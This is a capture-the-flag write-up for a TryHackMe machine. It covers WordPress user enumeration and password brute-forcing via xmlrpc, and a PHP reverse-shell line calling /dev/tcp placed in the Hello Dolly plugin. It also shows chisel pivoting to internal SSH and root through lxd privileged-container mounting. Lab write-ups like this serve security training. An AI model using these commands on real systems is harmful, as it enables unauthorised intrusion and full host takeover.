# Write up for 'For buisness reason' on <a href='https://tryhackme.com/room/forbusinessreasons'>TryHackMe</a>

### FLAG0

We start with nmap scan
##### nmap -sC -sV -v {MACHINE IP}

<br></br><img src='./img/Screenshot (117).png' /><br></br>

We can see that ssh port is closed which means that it is not accessible to us.
So let's visit the webpage on port 80. We can see that it is a wordpress website. Running wpscan on the website gives something interesting
##### wpscan --utl http://{MACHINE IP} -e vp,vt,dbe,u

We get the username **sysadmin**, we can also see that xmlrpc.php is available to us. We can use that to bruteforce creds for **sysadmin** user. (Read more about xmlrpc.php [here](https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32))

We can bruteforce the creds with wpscan
##### wpscan --url http://{MACHINE IP} -P {path to rockyou.txt} -U 'sysadmin'

This will give you the creds for user and you can login with those creds into the wordpress website,

Now we need to get a reverse shell. Let's go to plugin editor.
Change the plugin to **Hello dolly** and press **select**
<br></br><img src='./img/Screenshot (119).png' /><br></br>

Now scroll to the bottom and place the this code at the bottom
`exec('/bin/bash -c "bash -i >& /dev/tcp/{YOUR VPN IP}/4444 0>&1"');`
and update the file.

Go back to installed plugins and activate the plugin.
<br></br><img src='./img/Screenshot (120).png' /><br></br>
and we will get back a shell.

Now you can find the first flag in **/var/www/html**

### FLAG1
Bumping around the machine didn't really give anything back useful, so I got the linpeas.sh on the machine with curl since the machine did not have wget.
#### curl http://{MACHINE IP}:8000/linpeas.sh -O linpeas.sh
Download the linpeas.sh in /tmp and make it executable with `chmod +x linpeas.sh`.

In the scan we can see that there are different networks
<br></br><img src='./img/Screenshot (122).png' /><br></br>
We scan for ips that are up and running with the help of nmap, download the binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
. After downloading move the binary to target machine with curl and run the following command to scan for IPs
##### ./nmap -sn 172.18.0.1/24 10.0.0.5/24
This will give us a list of IPs that are up
* 172.18.0.1
* 172.18.0.2
* 172.18.0.3
* 172.18.0.4
* 10.0.0.1
* 10.0.0.2
* 10.0.0.3
* 10.0.0.4
* 10.0.0.5
* 10.0.0.6


We can scan the IPs for open port with nc, download the binary [here](https://github.com/yunchih/static-binaries/blob/master/nc).
Run this command to look for ports
##### ./nc -zv {IP} {PORTS}

Scan ips for common ports. We can see that only 172.18.0.1 has port 22 open. We can also see that ssh is not available for the reverse shell. So now we will use chisel, download he binary [here](https://github.com/jpillora/chisel/releases/tag/v1.7.6). Download the .gzip file and extract it to get the binary.
We will use chisel for port forwarding, read more about it [here](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

On the attacking machine i.e your own machine, run the following command
##### ./chisel server -p 8000 --reverse -v

Move chisel binary to the target machine and run the following command
#### ./chisel client {YOUR VPN IP}:8000 R:127.0.0.1:8001:172.18.0.1:22

This will forward the ssh of the intranet IP to us on our localhost at port 8001,
Now we can use ssh with the password that we earlier bruteforced
##### ssh sysadmin@127.0.0.1 -p 8001

Enter the password and we get the shell as sysadmin

### FLAG2

Now that we have the user, we can try for root.
Running `id` command tells us that we are part of the lxd group and by running `lxc image list` we can list the images. We can use the `lxd privesc` to get the root.
Read about the privesc [here](https://www.hackingarticles.in/lxd-privilege-escalation/)

Run the following commands on your own machine i.e youe attacking machine
##### git clone  https://github.com/saghul/lxd-alpine-builder.git
##### cd lxd-alpine-builder
##### ./build-alpine
*NOTE: If you face any problem with build-alpine then you can look for a solution [here](https://github.com/saghul/lxd-alpine-builder/issues/1)*

Once you get the `.tar.gz` file, move that file to the target machine with curl.

On the target machine run the following set of commands in the same directory as the `tar.gz` (not necessary though, you can specify the path in the commands too)

##### lxc image import ./alpine-v3.13-x86_64-20210311_0157.tar.gz --alias myimage
##### lxc image list {to check if our image is created of not}
##### lxc init myimage ignite -c security.privileged=true
##### lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
##### lxc start ignite
##### lxc exec ignite /bin/sh

We get the shell as roo and you can get the flag with `cat /mnt/root/root/root.txt`
